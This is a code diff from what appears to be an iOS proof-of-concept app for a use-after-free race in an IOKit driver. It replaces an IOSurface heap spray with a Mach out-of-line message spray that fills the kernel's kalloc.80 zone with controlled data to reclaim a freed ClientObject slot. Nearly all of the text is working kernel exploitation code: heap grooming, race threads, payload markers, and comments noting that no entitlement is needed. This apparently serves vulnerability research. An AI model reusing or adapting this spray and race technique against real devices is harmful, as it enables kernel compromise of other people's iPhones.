@@ -74,18 +74,6 @@ static void *sSecurityHandle = NULL;
 static SecTaskCreateFromSelfFn sSecTaskCreateFromSelf = NULL;
 static SecTaskCopyValueForEntitlementFn sSecTaskCopyValueForEntitlement = NULL;
 
-// ---------- IOSurface function pointers ----------
-// Used to spray persistent OSData objects into kalloc.80 to reclaim
-// the freed ClientObject slot during the UAF race window.
-// IOSurfaceRef is defined by the SDK (<IOSurface/IOSurfaceRef.h>).
-typedef IOSurfaceRef (*IOSurfaceCreateFn)(CFDictionaryRef properties);
-typedef kern_return_t (*IOSurfaceSetValueFn)(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
-typedef kern_return_t (*IOSurfaceRemoveValueFn)(IOSurfaceRef surface, CFStringRef key);
-
-static void *sIOSurfaceHandle = NULL;
-static IOSurfaceCreateFn       sIOSurfaceCreate       = NULL;
-static IOSurfaceSetValueFn     sIOSurfaceSetValue     = NULL;
-static IOSurfaceRemoveValueFn  sIOSurfaceRemoveValue  = NULL;
 
 // ---------- Constants ----------
 
@@ -333,23 +321,6 @@ static const char kOpenPropertiesGarbage[] =
     sSecTaskCopyValueForEntitlement =
         (SecTaskCopyValueForEntitlementFn)dlsym(sSecurityHandle, "SecTaskCopyValueForEntitlement");
     return sSecTaskCreateFromSelf && sSecTaskCopyValueForEntitlement;
-}
-
-- (BOOL)loadIOSurfaceSymbols {
-    if (sIOSurfaceHandle && sIOSurfaceCreate && sIOSurfaceSetValue && sIOSurfaceRemoveValue) {
-        return YES;
-    }
-    if (!sIOSurfaceHandle) {
-        sIOSurfaceHandle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
-                                  RTLD_NOW | RTLD_LOCAL);
-    }
-    if (!sIOSurfaceHandle) return NO;
-
-    sIOSurfaceCreate      = (IOSurfaceCreateFn)      dlsym(sIOSurfaceHandle, "IOSurfaceCreate");
-    sIOSurfaceSetValue    = (IOSurfaceSetValueFn)    dlsym(sIOSurfaceHandle, "IOSurfaceSetValue");
-    sIOSurfaceRemoveValue = (IOSurfaceRemoveValueFn) dlsym(sIOSurfaceHandle, "IOSurfaceRemoveValue");
-
-    return sIOSurfaceCreate && sIOSurfaceSetValue && sIOSurfaceRemoveValue;
 }
 
 // ---- Main flow ----
@@ -3452,19 +3423,21 @@ static const char kOpenPropertiesGarbage[] =
     //      was executing sel 0 (open) through the command gate, operating on provider
     //      state that was freed by a concurrent/preceding closeForClient.
     //
-    // Test strategy (IOSurface spray edition):
+    // Test strategy (Mach OOL spray edition):
     //   - conn[0]: lifecycle thread — close → (reader races on dangling ptr) → reopen
     //   - conn[1..readerEnd]: reader threads — copyEvent tight loop (selector 2, un-gated)
     //   - conn[readerEnd..N]: churn threads — close/reopen for provider-level pressure
-    //   - Spray thread: cycles IOSurfaceSetValue/RemoveValue to constantly alloc/free
-    //     from kalloc.80. When conn[0]'s ClientObject is freed, the next SetValue reclaims
-    //     the slot with our controlled data (persistent, unlike the old transient spray).
+    //   - Spray thread: cycles Mach OOL message send/receive. Each send copies
+    //     72 bytes of controlled data to kalloc.80. Messages are held in a local
+    //     port queue (not received) until the UAF window closes. When conn[0]'s
+    //     ClientObject is freed, the spray thread's next send reclaims the slot.
+    //     No entitlement needed — mach_msg is available to all processes.
     //   - NOTE: On affected builds, this test may trigger unexpected behavior.
 
     static const int kLifecycleCycles = 2000;
     static const int kMagazineDrainCycles = 4;
     static const NSTimeInterval kStressDuration = 25.0;
-    static const int kSpraySurfaceCount = 128;  // kalloc.80 slot coverage across CPU magazines
+    enum { kOolMsgCount = 300, kOolDataSize = 72 };
 
     __block atomic_int stopFlag = 0;
     __block atomic_int anomalyCount = 0;
@@ -3546,63 +3519,64 @@ static const char kOpenPropertiesGarbage[] =
     [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning complete (%d cycles x %d conns = %d ClientObject alloc/release pairs). closeErrors=%u openErrors=%u",
                      kMagazineDrainCycles, connCount, kMagazineDrainCycles * connCount, drainCloseErrs, drainOpenErrs]];
 
-    // ---- IOSurface spray setup (persistent kalloc.80 objects) ----
-    BOOL sprayAvailable = [self loadIOSurfaceSymbols];
-    IOSurfaceRef *spraySurfaces = NULL;
-    CFStringRef  *sprayKeys     = NULL;
-    CFDataRef    *sprayPayloads = NULL;
-    __block int  sprayAvailableFlag = 0;
-    if (sprayAvailable) {
-        spraySurfaces  = (IOSurfaceRef *)calloc(kSpraySurfaceCount, sizeof(IOSurfaceRef));
-        sprayKeys      = (CFStringRef  *)calloc(kSpraySurfaceCount, sizeof(CFStringRef));
-        sprayPayloads  = (CFDataRef    *)calloc(kSpraySurfaceCount, sizeof(CFDataRef));
-        if (!spraySurfaces || !sprayKeys || !sprayPayloads) {
-            sprayAvailable = NO;
+    // ---- Mach OOL spray setup (persistent kalloc.80 objects) ----
+    // Out-of-line (OOL) data sent via mach_msg is copied to kalloc by the kernel.
+    // 72-byte OOL payload → kalloc.80 zone. Messages are held in a local port queue
+    // (not received) so the kernel buffers persist. Each send/receive cycle in the
+    // spray thread continually allocs/frees one kalloc.80 slot — when conn[0]'s
+    // ClientObject is freed, the next send's LIFO allocation reclaims that exact slot.
+    // No special entitlements needed: mach_msg is available to all iOS processes.
+    typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t ool;
+    } OOLMsg;
+
+    mach_port_t sprayPort = MACH_PORT_NULL;
+    __block int sprayReady = 0;
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayPort) == KERN_SUCCESS) {
+        mach_port_insert_right(mach_task_self_, sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+        sprayReady = 1;
+    }
+
+    // Need heap payload so block capture is valid (stack buffer would go out of scope)
+    uint8_t *sprayPayload = NULL;
+    if (sprayReady) {
+        sprayPayload = (uint8_t *)malloc(kOolDataSize);
+        if (sprayPayload) {
+            memset(sprayPayload, 0x41, kOolDataSize);
+            *(uint64_t *)(sprayPayload + 0)  = 0xFEEDC0DEDEADBEEFULL;
+            *(uint64_t *)(sprayPayload + 8)  = 0xCAFEBABEDEADBEEFULL;
+            *(uint64_t *)(sprayPayload + 16) = 0xBADC0FFEE0DDF00DULL;
+            *(uint64_t *)(sprayPayload + 32) = 0xDEADBEEFDEADBEEFULL;
+
+            // Pre-fill: send messages to fill kalloc.80 freelist with our data
+            int sent = 0;
+            for (int i = 0; i < kOolMsgCount; i++) {
+                OOLMsg msg;
+                memset(&msg, 0, sizeof(msg));
+                msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                msg.header.msgh_size = sizeof(OOLMsg);
+                msg.header.msgh_remote_port = sprayPort;
+                msg.header.msgh_id = (mach_msg_id_t)i;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                msg.ool.address = sprayPayload;
+                msg.ool.size = kOolDataSize;
+                msg.ool.deallocate = FALSE;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                    sent++;
+                }
+            }
+            [self appendLog:[NSString stringWithFormat:@"  Mach OOL spray: %d/%d msgs sent, kalloc.80 pre-filled", sent, kOolMsgCount]];
+            if (sent == 0) sprayReady = 0;
+        } else {
+            sprayReady = 0;
         }
     }
-    if (sprayAvailable) {
-        sprayAvailableFlag = 1;
-        int created = 0;
-        for (int i = 0; i < kSpraySurfaceCount; i++) {
-            int32_t w = 16, h = 16, bpe = 4, allocSize = 256, pf = 0;
-            CFNumberRef cfW   = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
-            CFNumberRef cfH   = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
-            CFNumberRef cfBPE = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
-            CFNumberRef cfAS  = CFNumberCreate(NULL, kCFNumberSInt32Type, &allocSize);
-            CFNumberRef cfPF  = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
-            const void *dictKeys[] = {
-                CFSTR("IOSurfaceWidth"),
-                CFSTR("IOSurfaceHeight"),
-                CFSTR("IOSurfaceBytesPerElement"),
-                CFSTR("IOSurfaceAllocSize"),
-                CFSTR("IOSurfacePixelFormat")
-            };
-            const void *dictVals[] = { cfW, cfH, cfBPE, cfAS, cfPF };
-            CFDictionaryRef props = CFDictionaryCreate(NULL, dictKeys, dictVals, 5,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            CFRelease(cfW); CFRelease(cfH); CFRelease(cfBPE); CFRelease(cfAS); CFRelease(cfPF);
-            spraySurfaces[i] = sIOSurfaceCreate(props);
-            CFRelease(props);
-            if (!spraySurfaces[i]) break;
-            created++;
-
-            char keyBuf[16];
-            snprintf(keyBuf, sizeof(keyBuf), "k%d", i);
-            sprayKeys[i] = CFStringCreateWithCString(NULL, keyBuf, kCFStringEncodingUTF8);
-
-            uint8_t payload[48];
-            memset(payload, 0x41 + (i & 0xF), 48);
-            *(uint64_t *)(payload + 0)  = 0xFEEDC0DEDEADBEEFULL;
-            *(uint64_t *)(payload + 8)  = 0xCAFEBABEDEADBEEFULL;
-            *(uint64_t *)(payload + 16) = 0xBADC0FFEE0DDF00DULL;
-            *(uint64_t *)(payload + 32) = (uint64_t)i;
-            sprayPayloads[i] = CFDataCreate(NULL, payload, 48);
-
-            sIOSurfaceSetValue(spraySurfaces[i], sprayKeys[i], sprayPayloads[i]);
-        }
-        [self appendLog:[NSString stringWithFormat:@"  IOSurface spray: %d/%d surfaces created, kalloc.80 pre-filled", created, kSpraySurfaceCount]];
-    } else {
-        [self appendLog:@"  WARNING: IOSurface symbols unavailable — spray disabled"];
+    if (!sprayReady) {
+        [self appendLog:@"  WARNING: Mach OOL spray setup failed — spray disabled"];
     }
 
     // Capture mapped buffer state immediately before stress
@@ -3613,27 +3587,49 @@ static const char kOpenPropertiesGarbage[] =
 
     dispatch_group_t group = dispatch_group_create();
 
-    // ---- IOSurface spray thread — persistent kalloc.80 alloc/free cycling ----
-    // Continuously removes and re-sets values on spray surfaces. Each SetValue
-    // allocates an OSData (~72 bytes → kalloc.80) from the kernel zone freelist.
-    // When conn[0]'s ClientObject is freed, the freelist is LIFO, so the very next
-    // SetValue allocation reclaims that exact slot with our controlled data.
-    // This replaces the old transient IOConnectCallMethod spray which was:
-    //   a) Freed after the call returned (too short a window)
-    //   b) Corrupted connection state with garbage XML (100% open failure)
+    // ---- Mach OOL spray thread — kalloc.80 alloc/free cycling ----
+    // Receive one pending message (frees one kalloc.80 OOL copy), then re-send
+    // (allocates a new 72-byte OOL copy from kalloc.80's freelist). The freelist
+    // is LIFO, so if conn[0]'s ClientObject was just freed, this send reclaims
+    // that exact slot with our controlled data.
     dispatch_queue_t sprayQueue = NULL;
-    if (sprayAvailableFlag) {
+    if (sprayReady) {
         sprayQueue = dispatch_queue_create("com.testpoc.lifecycle.spray",
             dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));
         dispatch_group_enter(group);
         dispatch_async(sprayQueue, ^{
-            int idx = 0;
             while (atomic_load(&stopFlag) == 0) {
-                sIOSurfaceRemoveValue(spraySurfaces[idx], sprayKeys[idx]);
-                sIOSurfaceSetValue(spraySurfaces[idx], sprayKeys[idx], sprayPayloads[idx]);
-                idx++;
-                if (idx >= kSpraySurfaceCount) idx = 0;
+                // Receive one msg → frees one OOL copy from kalloc.80
+                OOLMsg rcvMsg;
+                rcvMsg.header.msgh_local_port = sprayPort;
+                rcvMsg.header.msgh_size = sizeof(OOLMsg);
+                mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
+
+                // Re-send → allocates from kalloc.80 (LIFO: reclaims last freed slot)
+                OOLMsg sndMsg;
+                memset(&sndMsg, 0, sizeof(sndMsg));
+                sndMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                sndMsg.header.msgh_size = sizeof(OOLMsg);
+                sndMsg.header.msgh_remote_port = sprayPort;
+                sndMsg.body.msgh_descriptor_count = 1;
+                sndMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                sndMsg.ool.address = sprayPayload;
+                sndMsg.ool.size = kOolDataSize;
+                sndMsg.ool.deallocate = FALSE;
+                sndMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                mach_msg(&sndMsg.header, MACH_SEND_MSG, sizeof(OOLMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
             }
+            // Drain remaining messages
+            int drained = 0;
+            while (1) {
+                OOLMsg dMsg;
+                dMsg.header.msgh_local_port = sprayPort;
+                dMsg.header.msgh_size = sizeof(OOLMsg);
+                mach_msg_return_t mr = mach_msg(&dMsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(OOLMsg), sprayPort, 1, MACH_PORT_NULL);
+                if (mr != MACH_MSG_SUCCESS) break;
+                drained++;
+            }
+            [self appendLog:[NSString stringWithFormat:@"  Spray drained: %d msgs", drained]];
             dispatch_group_leave(group);
         });
     }
@@ -4089,24 +4085,22 @@ static const char kOpenPropertiesGarbage[] =
     //   3. If device survives: either spray didn't hit OR copyEvent didn't
     //      dereference during the window (timing/zone issue)
     {
-        if (sprayAvailableFlag) {
+        if (sprayReady) {
             [self appendLog:[NSString stringWithFormat:
-                @"  IOSurface spray active: %d surfaces cycling kalloc.80", kSpraySurfaceCount]];
+                @"  Mach OOL spray active: %d msgs cycling kalloc.80", kOolMsgCount]];
         } else {
-            [self appendLog:@"  IOSurface spray NOT available — no kalloc.80 pressure applied"];
+            [self appendLog:@"  Mach OOL spray NOT available — no kalloc.80 pressure applied"];
         }
     }
 
     // ---- Cleanup spray resources ----
-    if (spraySurfaces) {
-        for (int i = 0; i < kSpraySurfaceCount; i++) {
-            if (sprayKeys[i])     CFRelease(sprayKeys[i]);
-            if (sprayPayloads[i]) CFRelease(sprayPayloads[i]);
-            if (spraySurfaces[i]) CFRelease(spraySurfaces[i]);
-        }
-        free(spraySurfaces);
-        free(sprayKeys);
-        free(sprayPayloads);
+    if (sprayPort != MACH_PORT_NULL) {
+        mach_port_destroy(mach_task_self_, sprayPort);
+        sprayPort = MACH_PORT_NULL;
+    }
+    if (sprayPayload) {
+        free(sprayPayload);
+        sprayPayload = NULL;
     }
 
     // ---- Release multi-conn client slots FIRST (free provider for probe) ----
@@ -4447,8 +4441,8 @@ static const char kOpenPropertiesGarbage[] =
         @"  Lifecycle errors: close=%d open=%d (of %d cycles)",
         finalCloseErrs, finalOpenErrs, finalLifecycleIters]];
     [self appendLog:[NSString stringWithFormat:
-        @"  Spray: %@ (%d surfaces, kalloc.80 IOSurface OSData cycling)",
-        sprayAvailableFlag ? @"ACTIVE" : @"OFF", kSpraySurfaceCount]];
+        @"  Spray: %@ (%d msgs, kalloc.80 Mach OOL cycling)",
+        sprayReady ? @"ACTIVE" : @"OFF", kOolMsgCount]];
     [self appendLog:[NSString stringWithFormat:
         @"  Churn errors: close=%d open=%d (of %d cycles)",
         finalChurnCloseErrs, finalChurnOpenErrs, finalChurnIters]];
